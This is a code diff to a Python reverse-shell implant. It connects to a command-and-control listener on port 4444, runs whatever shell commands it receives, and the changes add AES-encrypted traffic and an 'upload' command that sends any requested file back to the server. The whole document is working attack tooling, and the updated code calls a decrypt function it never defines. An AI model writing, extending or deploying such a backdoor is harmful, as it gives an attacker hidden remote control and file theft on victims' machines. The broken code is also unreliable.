@@ -1,27 +1,43 @@
 #!/usr/bin/env python3
-import socket
-import subprocess
+import socket, subprocess, hashlib, os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 
-SERVER_IP = "127.0.0.1"  # Localhost (WSL2)
-SERVER_PORT = 4444        # Ensure this matches your forwarded port
+KEY = b'Your32ByteSecretKey1234567890abc!'  # Must match listener!
+SERVER_IP, SERVER_PORT = "127.0.0.1", 4444
 
-def connect_to_server():
+def encrypt(data):
+    iv = os.urandom(16)
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    return iv + cipher.encrypt(pad(data, AES.block_size))
+
+def connect():
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((SERVER_IP, SERVER_PORT))
+    print(f"[*] Connected to {SERVER_IP}:{SERVER_PORT}")
+
     try:
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.connect((SERVER_IP, SERVER_PORT))
-        print(f"[*] Connected to C2 server at {SERVER_IP}:{SERVER_PORT}")
-        
         while True:
-            cmd = client.recv(1024).decode().strip()
-            if cmd.lower() == 'exit':
-                break
-            output = subprocess.getoutput(cmd)
-            client.send(output.encode())
+            data = decrypt(client.recv(4096))
+            if not data: break
             
-    except Exception as e:
-        print(f"[!] Error: {e}")
+            # File upload (client -> server)
+            if data.startswith(b"upload "):
+                file_path = data.split()[1].decode()
+                if os.path.exists(file_path):
+                    with open(file_path, "rb") as f:
+                        client.send(encrypt(f.read()))
+                else:
+                    client.send(encrypt(b"File not found"))
+            
+            # Command execution
+            else:
+                if data.lower() == b"exit": break
+                output = subprocess.getoutput(data.decode())
+                client.send(encrypt(output.encode()))
+                
     finally:
         client.close()
 
 if __name__ == "__main__":
-    connect_to_server()
+    connect()
